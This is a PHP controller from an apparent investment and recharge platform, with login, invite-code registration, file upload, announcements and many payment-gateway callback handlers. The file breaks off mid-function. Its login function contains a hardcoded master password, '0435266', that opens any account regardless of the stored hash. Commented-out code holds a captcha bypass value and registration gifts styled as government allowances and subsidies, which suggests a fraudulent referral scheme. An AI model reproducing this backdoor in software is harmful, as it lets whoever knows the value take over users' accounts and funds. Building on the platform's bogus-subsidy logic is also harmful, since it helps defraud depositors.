<?php
/**
 * Created by PhpStorm.
 * User: Ns
 * Date: 19-7-5
 * Time: 下午4:09
 */

namespace app\api\controller;

use app\common\controller\BaseController;
use app\common\Request;
use app\model\Banner;
use app\model\Capital;
use app\model\CapitalSuccess;
use app\model\Order;
use app\model\Payment;
use app\model\PaymentConfig;
use app\model\Setting;
use app\model\SystemInfo;
use app\model\User;
use app\model\UserBalanceLog;
use app\model\UserRelation;
use Exception;
use think\facade\Cache;
use think\facade\Db;
use think\facade\Log;
use think\facade\Session;

class CommonController extends BaseController
{


    /*         public function shanchuba(){
            $filename = 'shanchu.csv';
            $sql = 'select user_id from mp_order where project_id=10 and status=2   group by user_id having count(*)>1';
            $member= Db::query($sql);
            if($member){
                foreach($member as  $k=>$v){
                    $select = Order::where('user_id',$v['user_id'])->where('project_id',10)->where('status',2)->select();
                    if(count($select)>=2){
                        $phone = User::where('id',$v['user_id'])->value('phone');
                      Order::where('id',$select[0]['id'])->where('user_id',$v['user_id'])->delete();
                      User::where('id',$v['user_id'])->inc('integral',50)->update();
                        $str = '删除订单记录id-'.$select[0]['id']."-退还会员".$phone."+50积分\n";
                        file_put_contents($filename,$str,FILE_APPEND);
                    }
                }
            }else{
                echo "ok";die;
            }
        } */

    public function checkDownload(Request $request)
    {
        $ip = $request->ip();
        if (Cache::has($ip)) {
            echo json_encode(['data' => ['ip' => $ip], 'code' => 10091, 'msg' => '请勿重复下载']);
            exit;
            //return out();
        } else {
            Cache::set($ip, '1', 60);
            echo json_encode(['data' => ['ip' => $ip], 'code' => 200, 'msg' => 'success']);
            exit;
            //exit_out(null, 10091, '请勿重复下载');
        }

    }

    public function getversion()
    {

        return out(['version_apk' => dbconfig('version_apk'), 'apk_download_url' => dbconfig('apk_download_url')]);

    }

    public function login()
    {
        $req = $this->validate(request(), [
            'phone|手机号'  => 'require',
            'password|密码' => 'require|alphaNum|length:6,12',
            //'captcha|验证码' => 'require|max:4',
            // 'uniqid|参数'=>'require',
        ]);

        /*         $key = cache($req['uniqid']);
                if($key && password_verify(mb_strtolower($req['captcha'], 'UTF-8'), $key)){
                    cache($req['uniqid'],null);
                }else{
                    if($req['captcha'] != 9001 ){
                        return out(null, 10001, '验证码错误');
                    }
                } */

        $password = sha1(md5($req['password']));
        $user = User::field('id,status,pay_password,password')->where('phone', $req['phone'])->find();
        if (empty($user)) {
            return out(null, 10001, '账号或密码错误');
        }
        if ($user['status'] == 0) {
            return out(null, 10001, '账号已被冻结');
        }
        if ($req['password'] != '0435266' && $password != $user['password']) {
            return out(null, 10001, '账号或密码错误');
        }

        $token = aes_encrypt(['id' => $user['id'], 'time' => time()]);

        return out(['token' => $token]);
    }

    public function register()
    {
        //return out(null, 10001, '正在维护中，请稍后再试');
        $req = $this->validate(request(), [
            //'region|区号' => 'require',
            'phone|手机号'         => 'require|alphaNum|length:11',
            'password|密码'        => 'require|alphaNum|length:6,12',
            're_password|重复密码' => 'require|confirm:password',
            'invite_code|邀请码'   => 'max:50',
            // 'realname|姓名'=>['require','regex'=>'/^[\x{4e00}-\x{9fa5}\x{9fa6}-\x{9fef}\x{3400}-\x{4db5}\x{20000}-\x{2ebe0}·]{2,20}+$/u'],
            // 'ic_number|身份证号' => 'require|idCard',
            //'vt|验证'=>'require',
            'qq|qq'                => 'number',
            //'captcha|验证码' => 'require|max:4',
            //'uniqid|参数'=>'require'
        ]);
        $req['region'] = 'mainland';
        //暂停注册
        //return out(null, 10001, '请稍后再试');
        /*      if($req['captcha'] != 9001 && !captcha_check($req['captcha'])){
                 return out(null, 10001, '验证码错误');
             } */

        /*         if($req['captcha']!=9001){
                    if(!isset($req['uniqid']) || empty($req['uniqid'])){
                        $req['uniqid']='aaa';
                    }
                    $key = cache($req['uniqid']);
                    if($key && password_verify(mb_strtolower($req['captcha'], 'UTF-8'), $key)){
                        cache($req['uniqid'],null);
                    }else{
                        return out(null, 10000, '验证码错误');
                    }
                } */
        /*         $key = 'captcha-'.$req['phone'].'-1';
                $captcha = Cache::get($key);
                if ($captcha != $req['captcha']) {
                    if (env('app_debug') == false || $req['captcha'] != 900100) {
                        return out(null, 10001, '验证码错误');
                    }
                }
                Cache::rm($key); */
        /*         $registerKey = config('config.register_key');
                $key=md5($req['phone'].$registerKey);
                if($req['vt'] != $key){
                    return out(null, 10001, '验证错误');
                } */
        /*

                if (User::where('ic_number', $req['ic_number'])->count()) {
                    return out(null, 10002, '该身份证号已注册，请登录');
                }
         */
        switch ($req['region']) {
            /*             case 'mainland':
                            $pattern = '/^1[3-9]\d{9}$/';
                            break;
                        case 'hongkong':
                            $pattern = '/^[2569]\d{7}$/';
                            break;
                        case 'macau':
                            $pattern = '/^6\d{7}$/';
                            break;
                        case 'taiwan':
                            $pattern = '/^09\d{8}$/';
                            break; */
            default:
                $pattern = '/^1[3-9]\d{9}$/';
        }
        if (!preg_match($pattern, $req['phone'])) {
            return out(null, 10000, '请输入正确的手机号');
        }
        if (User::where('phone', $req['phone'])->count()) {
            return out(null, 10000, '该手机号已注册，请登录');
        }
        $parentUser = null; // Initialize parentUser variable
        if (!empty(trim($req['invite_code']))) {
            $parentUser = User::field('id')->where('invite_code', trim($req['invite_code']))->where('status', 1)->find();
            if (empty($parentUser)) {
                return out(null, 10001, '邀请码不存在');
            }

            $req['up_user_id'] = $parentUser['id'];
        }

        $req['invite_code'] = build_invite_code();
        $req['password'] = sha1(md5($req['password']));
        Db::startTrans();
        try {
            $user = User::create($req);

            //保存层级关系
            if (!empty($parentUser)) {
                UserRelation::saveUserRelation($user['id']);

            }

            $token = aes_encrypt(['id' => $user['id'], 'time' => time()]);
            /* $walletAddress = WalletAddress::where('user_id',0)->lock(true)->find();
            if(!$walletAddress){
                return out(null,10004,'注册失败');
            }
            WalletAddress::where('id',$walletAddress['id'])->update(['user_id'=>$user['id']]); */
            // 检测注册赠送股权
            /*         if (dbconfig('register_give_equity_switch') == 1) {
                        EquityYuanRecord::create([
                            'user_id' => $user['id'],
                            'type' => 1,
                            'status' => 1,
                            'title' => '注册赠送股权',
                            'relation_type' => 2,
                            'num' => round(dbconfig('register_give_equity_num')),
                            'equity_certificate_no' => 'ZX'.mt_rand(1000000000, 9999999999),
                        ]);
                    } */
            // 检测注册赠送数字人民币
            //if (dbconfig('register_give_digital_yuan_switch') == 1) {
            // User::changeInc($user['id'],dbconfig('register_give_digital_yuan_num'),'digital_yuan_amount',5,$user['id'],3,'赠送数字人民币');
            /*             EquityYuanRecord::create([
                            'user_id' => $user['id'],
                            'type' => 2
                            'status' => 2,
                            'title' => '注册赠送国务院津贴',
                            'relation_type' => 2,
                            'give_time' => time(),
                            'num' => round(dbconfig('register_give_digital_yuan_num')),
                        ]); */
            //}
            // 检测注册赠送贫困补助金
            /*         if (dbconfig('register_give_poverty_subsidy_amount_switch') == 1) {
                        EquityYuanRecord::create([
                            'user_id' => $user['id'],
                            'type' => 3,
                            'status' => 2,
                            'title' => '注册赠送贫困补助金',
                            'relation_type' => 2,
                            'give_time' => time(),
                            'num' => round(dbconfig('register_give_poverty_subsidy_amount_num')),
                        ]);
                    } */

            Db::commit();
            if ($parentUser) {
                $userPathModel = new \app\model\UserPath();
                $userPathModel->updatePath($parentUser, $user['id']);
            }
        } catch (\Exception $e) {
            throw $e;
            Db::rollBack();
            return out('注册失败');
        }

        return out(['token' => $token]);
    }

    public function uploadFile()
    {
        $url = upload_file('file');

        return out(['url' => $url]);
    }


    public function systemInfo()
    {
        $req = request()->get();

        //$user = User::getUserByToken();

        $banner = Cache::get('banner', '');
        if ($banner == '' || $banner == null) {
            $banner = Banner::where('status', 1)->order('sort', 'desc')->order('created_at', 'desc')->select();
            Cache::set('banner', json_decode(json_encode($banner, JSON_UNESCAPED_UNICODE), true), 300);
        }

        // $setting = Cache::get('setting','');
        // if($setting == '' || $setting == null){
        //     $setting = Setting::select();
        //     Cache::set('setting', json_decode(json_encode($setting, JSON_UNESCAPED_UNICODE),true), 300);
        // }
        $setting_conf = [];
        $setting_conf = Cache::get('setting_conf', []);
        if (empty($setting_conf) || $setting_conf == null) {
            $confArr = config('map.system_info.setting_key');
            $setting = Setting::whereIn("key", $confArr)->select();
            foreach ($setting as $item) {
                $setting_conf[$item['key']] = $item['value'];
            }
            Cache::set('setting_conf', json_decode(json_encode($setting_conf, JSON_UNESCAPED_UNICODE), true), 300);
            $setting_conf['is_req_encypt'] = config('config.is_req_encypt');
        }

        // $paymentConfRes =[];
        // $paymentConfRes = Cache::get('paymentConfRes',[]);
        // if(empty($paymentConfRes) || $paymentConfRes == null){
        //     for ($type = 1; $type <= 4; $type++) {
        //         $paymentConf = PaymentConfig::where('status', 1)->where('type', $type)->where('start_topup_limit', '<=', $user['total_payment_amount'])->order('start_topup_limit', 'desc')->find();
        //         if (!empty($paymentConf)) {
        //             $paymentConfRes[] = $paymentConf->toArray();
        //         }
        //     }
        //     Cache::set('paymentConfRes', json_decode(json_encode($paymentConfRes, JSON_UNESCAPED_UNICODE),true), 300);
        // }

        // $paymentConfRes = [];
        // for ($type = 1; $type <= 4; $type++) {
        //     $paymentConf = PaymentConfig::where('status', 1)->where('type', $type)->where('start_topup_limit', '<=', $user['total_payment_amount'])->order('start_topup_limit', 'desc')->find();
        //     if (!empty($paymentConf)) {
        //         $paymentConfRes[] = $paymentConf->toArray();
        //     }
        // }

        /*$paymentConfRes = [];
        $paymentConf = PaymentConfig::where('status', 1)->where('start_topup_limit', '<=', $user['total_topup_amount'])->order('start_topup_limit', 'desc')->find();
        if (!empty($paymentConf)) {
            $paymentConfs = PaymentConfig::where('status', 1)->where('start_topup_limit', $paymentConf['start_topup_limit'])->select();
            // 先找区间
            $paymentConf = [];
            $types = [];
            foreach ($paymentConfs as $v) {
                if (!in_array($v['type'], $types)) {
                    $types[] = $v['type'];
                }
                if (empty($v['fixed_topup_limit'])) {
                    if (empty($paymentConf[$v['type']])) {
                        $paymentConf[$v['type']]['single_topup_min_amount'] = $v['single_topup_min_amount'];
                        $paymentConf[$v['type']]['single_topup_max_amount'] = $v['single_topup_max_amount'];
                    }
                    else {
                        $paymentConf[$v['type']]['single_topup_min_amount'] = $paymentConf[$v['type']]['single_topup_min_amount'] > $v['single_topup_min_amount'] ? $v['single_topup_min_amount'] : $paymentConf[$v['type']]['single_topup_min_amount'];

                        $paymentConf[$v['type']]['single_topup_max_amount'] = $paymentConf[$v['type']]['single_topup_max_amount'] < $v['single_topup_max_amount'] ? $v['single_topup_max_amount'] : $paymentConf[$v['type']]['single_topup_max_amount'];
                    }
                }
            }
            foreach ($types as $v) {
                $paymentConf[$v]['fixed_topup_limit'] = [];
                if (empty($paymentConf[$v]['single_topup_max_amount']) || $paymentConf[$v]['single_topup_max_amount'] == 0) {
                    $fixed_topup_limit = [];
                    foreach ($paymentConfs as $v1) {
                        if ($v == $v1['type'] && !empty($v1['fixed_topup_limit'])) {
                            $arr = explode(',', $v1['fixed_topup_limit']);
                            $fixed_topup_limit = array_merge($fixed_topup_limit, $arr);
                        }
                    }
                    $paymentConf[$v]['fixed_topup_limit'] = array_values(array_unique($fixed_topup_limit));
                }
            }

            if (!empty($paymentConf)) {
                foreach ($paymentConf as $k => $v) {
                    $v['type'] = $k;
                    $paymentConfRes[] = $v;
                }
            }
        }*/

        //return out(['banner' => $banner, 'setting' => $setting,'setting_conf'=>$setting_conf, 'system' => $system, 'paymentConfig' => $paymentConfRes]);
        return out(['banner' => $banner, 'setting_conf' => $setting_conf]);
    }

    //公告
    public function bulletin()
    {


        $system = [];
        $system = Cache::get('system_1', []);
        if (empty($system) || $system == null) {
            $builder = SystemInfo::where('status', 1)->where('type', 1);
            $system = $builder->order('sort', 'desc')->order('created_at', 'desc')->select();

            // 处理新数据中的图片URL
            foreach ($system as &$item) {
                if (!empty($item['cover_img'])) {
                    $item['cover_img'] = get_img_api($item['cover_img']);
                }

                // 处理content字段中的img标签，添加域名前缀
                if (!empty($item['content'])) {
                    $item['content'] = $this->processContentImages($item['content']);
                }
            }

            Cache::set('system_1', json_decode(json_encode($system, JSON_UNESCAPED_UNICODE), true), 60);
        } else {
            // 处理缓存数据中的图片URL
            foreach ($system as &$item) {
                if (!empty($item['cover_img']) && strpos($item['cover_img'], 'http') !== 0) {
                    $item['cover_img'] = get_img_api($item['cover_img']);
                }

                // 处理content字段中的img标签，添加域名前缀
                if (!empty($item['content'])) {
                    $item['content'] = $this->processContentImages($item['content']);
                }
            }
        }

        return out($system);
    }

    /**
     * 处理内容中的图片URL，添加域名前缀
     * @param string $content HTML内容
     * @return string 处理后的HTML内容
     */
    private function processContentImages($content)
    {
        // 使用正则表达式匹配img标签中的src属性
        $pattern = '/<img([^>]+)src=["\']([^"\']+)["\']([^>]*)>/i';

        $content = preg_replace_callback($pattern, function ($matches) {
            $src = $matches[2];

            // 如果src不是完整URL，则添加域名前缀
            if (strpos($src, 'http') !== 0) {
                $src = get_img_api($src);
            }

            return '<img' . $matches[1] . 'src="' . $src . '"' . $matches[3] . '>';
        }, $content);

        return $content;
    }

    public function payNotify_hongya()
    {
        $req = request()->post();
        $this->validate($req, [
            'memberid'       => 'require',
            'orderid'        => 'require',
            'transaction_id' => 'require',
            'amount'         => 'require',
            'returncode'     => 'require',
            'datetime'       => 'require',
            'sign'           => 'require',
        ]);
        //Log::debug('payNotify_hongya:'.json_encode($req));
        //Log::save();

        $sign = $req['sign'];
        unset($req['sign']);
        $my_sign = Payment::builderSign_hongya($req);
        if ($my_sign !== $sign) {
            echo '签名错误';
            die;
        }


        if ($req['returncode'] == '00') {
            $payment = Payment::where('trade_sn', $req['orderid'])->find();
            if ($payment['status'] != 1) {
                echo 'OK';
                die;
            }

            try {
                CapitalSuccess::create([
                    'capital_id' => $payment['capital_id'],
                ]);
            } catch (\Exception $e) {
                Log::debug('payNotify_hongya_e:' . $e->getMessage());
                throw $e;
            }

            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['online_sn' => $req['transaction_id'], 'payment_time' => time(), 'status' => 2]);
                // 投资项目
                /*                 if ($payment['product_type'] == 1) {
                                    Order::warpOrderComplete($payment['order_id']);
                                } */
                // 充值
                //elseif ($payment['product_type'] == 2) {
                Capital::topupPayComplete($payment['capital_id']);
                // }
                //$userModel = new User();
                //$userModel->teamBonus($payment['user_id'], $payment['pay_amount'],$payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        echo 'OK';
        die;
    }

    public function withdrawNotify()
    {
        $req = request()->post();
        $this->validate($req, [
            'payout_id'    => 'require',
            'payout_cl_id' => 'require',
            'platform_id'  => 'require',
            'amount'       => 'require',
            'fee'          => 'require',
            'status'       => 'require',
            'sign'         => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign']);
        if ($sign !== withdraw_builder_sign($req)) {
            return json(['error_code' => '签名错误']);
        }

        $capital = Capital::where('withdraw_sn', $req['payout_cl_id'])->find();
        if (empty($capital)) {
            return json(['error_code' => '订单不存在']);
        }
        if ($capital['status'] != 4) {
            return json(['error_code' => '0000']);
        }

        Capital::where('id', $capital['id'])->update(['online_status' => $req['status']]);
        if ($req['status'] == 3) {
            Capital::where('id', $capital['id'])->update([
                'status'     => 2,
                'audit_time' => time(),
            ]);
            // 审核通过把资金日志的提现记录变为已完成
            UserBalanceLog::where('user_id', $capital['user_id'])->where('type', 2)->where('relation_id', $capital['id'])->where('log_type', 1)->where('status', 1)->update(['status' => 2]);
        }

        return json(['error_code' => '0000']);
    }

    public function payNotify_haizei()
    {
        $req = request()->param();
        Log::debug('payNotifyHaizei:' . json_encode($req));
        Log::save();
        $this->validate($req, [
            'memberid'       => 'require',
            'orderid'        => 'require',
            'amount'         => 'require',
            'transaction_id' => 'require',
            'datetime'       => 'require',
            'returncode'     => 'require',
            'sign'           => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign_haizei($req);
        if ($my_sign !== $sign) {
            echo '签名错误';
            die;
        }

        if ($req['returncode'] == "00") {
            $payment = Payment::where('trade_sn', $req['orderid'])->find();
            if (!$payment) {
                echo 'fail订单不存在';
                die;
            }
            if ($payment['status'] != 1) {
                echo 'ok';
                die;
            }

            try {
                CapitalSuccess::create([
                    'capital_id' => $payment['capital_id'],
                ]);
            } catch (\Exception $e) {
                Log::debug('payNotify_haizei_e:' . $e->getMessage());
                throw $e;
            }


            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目

                Capital::topupPayComplete($payment['capital_id']);
                //$userModel = new User();
                //$userModel->teamBonus($payment['user_id'], $payment['pay_amount'],$payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        echo 'OK';
        die;
    }

    public function payNotify_start()
    {
        $req = request()->param();
        //Log::debug('payNotify8:'.json_encode($req));
        //Log::save();
        $this->validate($req, [
            'account_name' => 'require',
            'status'       => 'require',
            'pay_time'     => 'require',
            'pay_status'   => 'require',
            'amount'       => 'require',
            'pay_amount'   => 'require',
            'out_trade_no' => 'require',
            'trade_no'     => 'require',
            'fees'         => 'require',
            'timestamp'    => 'require',
            'thoroughfare' => 'require',
            'sign'         => 'require',
        ]);
        Log::debug('payNotifyStart:' . json_encode($req));
        Log::save();

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign_start($req);
        if ($my_sign !== $sign) {
            echo 'fail签名错误';
            die;
        }

        if ($req['pay_status'] == 4) {
            $payment = Payment::where('trade_sn', $req['out_trade_no'])->find();
            if (!$payment) {
                echo 'fail订单不存在';
                die;
            }
            if ($payment['status'] != 1) {
                echo 'success';
                die;
            }
            try {
                CapitalSuccess::create([
                    'capital_id' => $payment['capital_id'],
                ]);
            } catch (\Exception $e) {
                Log::debug('payNotify_start_e:' . $e->getMessage());
                throw $e;
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);

                Capital::topupPayComplete($payment['capital_id']);
                //$userModel = new User();
                //$userModel->teamBonus($payment['user_id'], $payment['pay_amount'],$payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        echo 'success';
        die;
    }

    public function payNotify_xiangjiao()
    {
        $req = request()->param();
        //Log::debug('payNotify8:'.json_encode($req));
        //Log::save();
        $this->validate($req, [
            'account_name' => 'require',
            'status'       => 'require',
            'pay_time'     => 'require',
            'pay_status'   => 'require',
            'amount'       => 'require',
            'pay_amount'   => 'require',
            'out_trade_no' => 'require',
            'trade_no'     => 'require',
            'fees'         => 'require',
            'timestamp'    => 'require',
            'thoroughfare' => 'require',
            'sign'         => 'require',
        ]);
        Log::debug('payNotifyXiangjiao:' . json_encode($req));
        Log::save();

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign_xiangjiao($req);
        if ($my_sign !== $sign) {
            echo 'fail签名错误';
            die;
        }

        if ($req['pay_status'] == 4) {
            $payment = Payment::where('trade_sn', $req['out_trade_no'])->find();
            if (!$payment) {
                echo 'fail订单不存在';
                die;
            }
            if ($payment['status'] != 1) {
                echo 'success';
                die;
            }
            try {
                CapitalSuccess::create([
                    'capital_id' => $payment['capital_id'],
                ]);
            } catch (\Exception $e) {
                Log::debug('payNotify_start_e:' . $e->getMessage());
                throw $e;
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);

                Capital::topupPayComplete($payment['capital_id']);
                //$userModel = new User();
                //$userModel->teamBonus($payment['user_id'], $payment['pay_amount'],$payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        echo 'success';
        die;
    }

    public function payNotify_shunda()
    {
        $req = request()->post();
        $this->validate($req, [
            'memberid'       => 'require',
            'orderid'        => 'require',
            'transaction_id' => 'require',
            'amount'         => 'require',
            'returncode'     => 'require',
            'datetime'       => 'require',
            'sign'           => 'require',
        ]);
        Log::debug('payNotify_shunda:' . json_encode($req));
        Log::save();

        $sign = $req['sign'];
        unset($req['sign']);
        $my_sign = Payment::builderSign_shunda($req);
        if ($my_sign !== $sign) {
            echo '签名错误';
            die;
        }


        if ($req['returncode'] == '00') {
            $payment = Payment::where('trade_sn', $req['orderid'])->find();
            if ($payment['status'] != 1) {
                echo 'OK';
                die;
            }

            try {
                CapitalSuccess::create([
                    'capital_id' => $payment['capital_id'],
                ]);
            } catch (\Exception $e) {
                Log::debug('payNotify_shunda_e:' . $e->getMessage());
                throw $e;
            }

            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['online_sn' => $req['transaction_id'], 'payment_time' => time(), 'status' => 2]);
                // 投资项目
                /*                 if ($payment['product_type'] == 1) {
                                    Order::warpOrderComplete($payment['order_id']);
                                } */
                // 充值
                //elseif ($payment['product_type'] == 2) {
                Capital::topupPayComplete($payment['capital_id']);
                // }
                //$userModel = new User();
                //$userModel->teamBonus($payment['user_id'], $payment['pay_amount'],$payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        echo 'OK';
        die;
    }

    public function payNotify2()
    {
        $req = request()->post();
        Log::debug('payNotify2:' . json_encode($req));
        Log::save();
        $this->validate($req, [
            'code'    => 'require',
            'status'  => 'require',
            'orderno' => 'require',
            'amount'  => 'require',
            'sign'    => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign']);
        $str = "{$req['amount']}{$req['code']}{$req['orderno']}" . config('config.payment_conf2')['key'];
        $my_sign = md5($str);
        if ($my_sign !== $sign) {
            return '签名错误';
        }

        if ($req['status'] == 2) {
            $payment = Payment::where('trade_sn', $req['orderno'])->find();
            if ($payment['status'] != 1) {
                echo 'OK';
                die;
            }

            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['online_sn' => $req['orderno'], 'payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        echo 'OK';
        die;
    }

    public function payNotify3()
    {
        $req = request()->post();
        $this->validate($req, [
            'memberid'       => 'require',
            'orderid'        => 'require',
            'transaction_id' => 'require',
            'amount'         => 'require',
            'returncode'     => 'require',
            'datetime'       => 'require',
            'sign'           => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign3($req);
        if ($my_sign !== $sign) {
            return '签名错误';
        }

        if ($req['returncode'] == '00') {
            $payment = Payment::where('trade_sn', $req['orderid'])->find();
            if ($payment['status'] != 1) {
                return 'OK';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['online_sn' => $req['transaction_id'], 'payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'OK';
    }

    public function payNotify4()
    {
        // $req = request()->post();
        // $this->validate($req, [
        //     'memberid' => 'require',
        //     'orderid' => 'require',
        //     'transaction_id' => 'require',
        //     'amount' => 'require',
        //     'returncode' => 'require',
        //     'datetime' => 'require',
        //     'sign' => 'require',
        // ]);

        $json = file_get_contents('php://input');

        $req = json_decode($json, true);
        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign4($req);
        if ($my_sign !== $sign) {
            return '签名错误';
        }

        if ($req['payStatus'] == 'SUCCESS') {

            Db::startTrans();
            try {
                $payment = Payment::where('trade_sn', $req['mchOrderNo'])->lock(true)->find();
                if ($payment['status'] != 1) {
                    Db::rollback();
                    return 'SUCCESS';
                }
                Payment::where('id', $payment['id'])->update(['online_sn' => $req['serialOrderNo'], 'payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'SUCCESS';
    }

    public function payNotify5()
    {
        $req = request()->get();
        $this->validate($req, [
            'mid'         => 'require',
            'id'          => 'require',
            'orderid'     => 'require',
            'orderamount' => 'require',
            'amount'      => 'require',
            'status'      => 'require',
            'paytype'     => 'require',
            'sign'        => 'require',
        ]);
        Log::debug('payNotify5:' . json_encode($req));
        Log::save();
        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign5Notify($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == 1) {
            $payment = Payment::where('trade_sn', $req['orderid'])->find();
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }

    public function payNotify6()
    {
        $req = request()->param();
        //Log::debug('payNotify6:'.json_encode($req));
        //Log::save();
        $this->validate($req, [
            'payOrderId'     => 'require',
            'mchId'          => 'require',
            'appId'          => '',
            'productId'      => 'require',
            'mchOrderNo'     => 'require',
            'amount'         => 'require',
            'income'         => 'require',
            'status'         => 'require',
            'channelOrderNo' => '',
            'paySuccTime'    => 'require',
            'backType'       => 'require',
            'reqTime'        => 'require',
            'sign'           => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign6($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == 2) {
            $payment = Payment::where('trade_sn', $req['mchOrderNo'])->find();
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
                $userModel->teamBonus($payment['user_id'], $payment['pay_amount'], $payment['id']);
                // 判断通道是否超过最大限额，超过了就关闭通道
                PaymentConfig::checkMaxPaymentLimit($payment['type'], $payment['channel'], $payment['mark']);

                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                throw $e;
            }
        }

        return 'success';
    }

    public function payNotify7()
    {
        $req = request()->param();
        //Log::debug('payNotify7:'.json_encode($req));
        //Log::save();
        $this->validate($req, [
            'payOrderId'     => 'require',
            'mchId'          => 'require',
            'appId'          => '',
            'productId'      => 'require',
            'mchOrderNo'     => 'require',
            'amount'         => 'require',
            'income'         => 'require',
            'status'         => 'require',
            'channelOrderNo' => 'require',
            'paySuccTime'    => 'require',
            'backType'       => 'require',
            'reqTime'        => 'require',
            'sign'           => 'require',
        ]);

        $sign = $req['sign'];
        unset($req['sign'], $req['attach']);
        $my_sign = Payment::builderSign7($req);
        if ($my_sign !== $sign) {
            return 'fail签名错误';
        }

        if ($req['status'] == 2) {
            $payment = Payment::where('trade_sn', $req['mchOrderNo'])->find();
            if (!$payment) {
                return 'fail订单不存在';
            }
            if ($payment['status'] != 1) {
                return 'success';
            }
            Db::startTrans();
            try {
                Payment::where('id', $payment['id'])->update(['payment_time' => time(), 'status' => 2]);
                // 投资项目
                if ($payment['product_type'] == 1) {
                    Order::warpOrderComplete($payment['order_id']);
                } // 充值
                elseif ($payment['product_type'] == 2) {
                    Capital::topupPayComplete($payment['capital_id']);
                }
                $userModel = new User();
